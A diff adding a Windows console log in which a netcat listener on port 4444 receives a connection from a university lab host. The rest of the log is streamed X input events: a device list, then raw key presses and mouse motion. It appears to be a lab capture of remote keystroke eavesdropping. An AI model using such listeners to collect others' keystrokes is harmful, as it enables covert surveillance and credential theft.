@@ -1,0 +1,4971 @@
+Microsoft Windows [Version 10.0.20348.2582]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\wqu>nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.1.13.178] from csse-insp-5680-a.monmouth.edu [10.1.13.131] 45274
+ΓÄí Virtual core pointer                        id=2    [master pointer  (3)]
+ΓÄ£   Γå│ Virtual core XTEST pointer                    id=4    [slave  pointer  (2)]
+ΓÄ£   Γå│ Dell KB216 Wired Keyboard Consumer Control    id=10   [slave  pointer  (2)]
+ΓÄ£   Γå│ Telink 2.4G Mouse                             id=12   [slave  pointer  (2)]
+ΓÄ£   Γå│ Telink 2.4G Mouse Consumer Control            id=13   [slave  pointer  (2)]
+ΓÄú Virtual core keyboard                       id=3    [master keyboard (2)]
+    Γå│ Virtual core XTEST keyboard                     id=5    [slave  keyboard (3)]
+    Γå│ Power Button                                    id=6    [slave  keyboard (3)]
+    Γå│ Power Button                                    id=7    [slave  keyboard (3)]
+    Γå│ Sleep Button                                    id=8    [slave  keyboard (3)]
+    Γå│ Dell KB216 Wired Keyboard                       id=9    [slave  keyboard (3)]
+    Γå│ Dell KB216 Wired Keyboard System Control        id=11   [slave  keyboard (3)]
+    Γå│ Telink 2.4G Mouse System Control                id=14   [slave  keyboard (3)]
+    Γå│ Dell WMI hotkeys                                id=15   [slave  keyboard (3)]
+    Γå│ Dell KB216 Wired Keyboard Consumer Control      id=16   [slave  keyboard (3)]
+    Γå│ Telink 2.4G Mouse Consumer Control              id=17   [slave  keyboard (3)]
+    Γå│ USB Input Device USB Input Device               id=18   [slave  keyboard (3)]
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 26
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 26
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 26
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 26
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 53
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 53
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 31
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 31
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 28
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 28
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (18)
+    detail: 36
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 18 (18)
+    detail: 36
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (18)
+    detail: 36
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 18 (18)
+    detail: 36
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 1 (DeviceChanged)
+    device: 3 (9)
+    reason: SlaveSwitch
+        Reporting 1 classes:
+                Class originated from: 9. Type: XIKeyClass
+                Keycodes supported: 248
+
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 46
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 46
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 31
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 31
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 44
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 44
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 46
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 46
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 31
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 31
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 44
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 44
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 46
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 46
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 45
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 45
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 45
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 45
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 44
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 44
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 46
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 46
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 46
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 46
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 44
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 44
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 13 (RawKeyPress)
+    device: 3 (9)
+    detail: 45
+    valuators:
+
+EVENT type 2 (KeyPress)
+    device: 9 (9)
+    detail: 45
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 46
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 46
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 14 (RawKeyRelease)
+    device: 3 (9)
+    detail: 45
+    valuators:
+
+EVENT type 3 (KeyRelease)
+    device: 9 (9)
+    detail: 45
+    flags:
+    root: 629.00/193.00
+    event: 629.00/193.00
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -3.57 (-4.00)
+          1: -3.57 (-4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 629.12/193.19
+    event: 629.12/193.19
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 626.12
+        1: 190.19
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -15.31 (-11.00)
+          1: -11.13 (-8.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 626.81/190.05
+    event: 626.81/190.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 610.81
+        1: 179.05
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -28.00 (-14.00)
+          1: -18.00 (-9.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 610.81/179.05
+    event: 610.81/179.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 582.81
+        1: 161.05
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -28.00 (-14.00)
+          1: -18.00 (-9.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 582.81/161.05
+    event: 582.81/161.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 554.81
+        1: 143.05
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -24.00 (-12.00)
+          1: -14.00 (-7.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 554.81/143.05
+    event: 554.81/143.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 530.81
+        1: 129.05
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -20.00 (-10.00)
+          1: -12.00 (-6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 530.81/129.05
+    event: 530.81/129.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 510.81
+        1: 117.05
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.96 (-1.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 510.85/117.05
+    event: 510.85/117.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 508.85
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -3.56 (-2.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 508.28/117.05
+    event: 508.28/117.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 505.28
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.44 (-1.00)
+          1: 0.00 (0.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 505.84/117.05
+    event: 505.84/117.05
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 503.84
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: -1.07 (-1.00)
+          1: -1.07 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 503.77/117.98
+    event: 503.77/117.98
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 502.77
+        1: 115.98
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.70 (5.00)
+          1: -8.04 (-6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 502.47/115.95
+    event: 502.47/115.95
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 509.47
+        1: 107.95
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 5.62 (4.00)
+          1: -2.81 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 509.09/107.14
+    event: 509.09/107.14
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 515.09
+        1: 105.14
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 4.70 (4.00)
+          1: -2.35 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 515.79/105.79
+    event: 515.79/105.79
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 519.79
+        1: 102.79
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.49 (6.00)
+          1: -6.24 (-5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 519.28/102.54
+    event: 519.28/102.54
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 527.28
+        1: 96.54
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 12.72 (9.00)
+          1: -8.48 (-6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 528.00/96.06
+    event: 528.00/96.06
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 540.00
+        1: 88.06
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 15.70 (10.00)
+          1: -9.42 (-6.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 539.70/88.64
+    event: 539.70/88.64
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 555.70
+        1: 78.64
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 14.97 (9.00)
+          1: -8.32 (-5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 555.67/78.33
+    event: 555.67/78.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 570.67
+        1: 70.33
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 13.62 (8.00)
+          1: -8.51 (-5.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 570.29/70.81
+    event: 570.29/70.81
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 584.29
+        1: 61.81
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 13.75 (8.00)
+          1: -6.88 (-4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 584.04/61.94
+    event: 584.04/61.94
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 598.04
+        1: 54.94
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 10.28 (6.00)
+          1: -6.86 (-4.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 598.33/54.08
+    event: 598.33/54.08
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 608.33
+        1: 48.08
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 8.44 (5.00)
+          1: -5.06 (-3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 608.77/48.02
+    event: 608.77/48.02
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 616.77
+        1: 43.02
+    windows: root 0x1e5 event 0x1e5 child 0x8004a6
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 8.27 (5.00)
+          1: -3.31 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 616.03/43.71
+    event: 616.03/43.71
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 625.03
+        1: 39.71
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.47 (4.00)
+          1: -3.23 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 625.50/39.48
+    event: 625.50/39.48
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 631.50
+        1: 36.48
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.32 (4.00)
+          1: -3.16 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 631.82/36.31
+    event: 631.82/36.31
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 637.82
+        1: 33.31
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.79 (5.00)
+          1: -4.67 (-3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 637.61/33.64
+    event: 637.61/33.64
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 645.61
+        1: 28.64
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 7.72 (5.00)
+          1: -4.63 (-3.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 645.33/28.01
+    event: 645.33/28.01
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 653.33
+        1: 24.01
+    windows: root 0x1e5 event 0x1e5 child 0x1e0000a
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 6.15 (4.00)
+          1: -3.08 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 653.49/24.93
+    event: 653.49/24.93
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 659.49
+        1: 20.93
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.06 (2.00)
+          1: -1.53 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 659.54/20.41
+    event: 659.54/20.41
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 662.54
+        1: 19.41
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 4.50 (3.00)
+          1: -3.00 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 662.04/19.41
+    event: 662.04/19.41
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 667.04
+        1: 16.41
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 1.44 (1.00)
+          1: -1.44 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 667.47/16.97
+    event: 667.47/16.97
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 668.47
+        1: 14.97
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 4.06 (3.00)
+          1: -1.35 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 668.54/14.62
+    event: 668.54/14.62
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 672.54
+        1: 13.62
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.85 (3.00)
+          1: -1.28 (-1.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 672.38/13.33
+    event: 672.38/13.33
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 676.38
+        1: 12.33
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
+EVENT type 17 (RawMotion)
+    device: 2 (12)
+    detail: 0
+    flags:
+    valuators:
+          0: 3.67 (3.00)
+          1: -2.45 (-2.00)
+
+EVENT type 6 (Motion)
+    device: 12 (12)
+    detail: 0
+    flags:
+    root: 676.05/12.89
+    event: 676.05/12.89
+    buttons:
+    modifiers: locked 0 latched 0 base 0 effective: 0
+    group: locked 0 latched 0 base 0 effective: 0
+    valuators:
+        0: 680.05
+        1: 9.89
+    windows: root 0x1e5 event 0x1e5 child 0x1e3
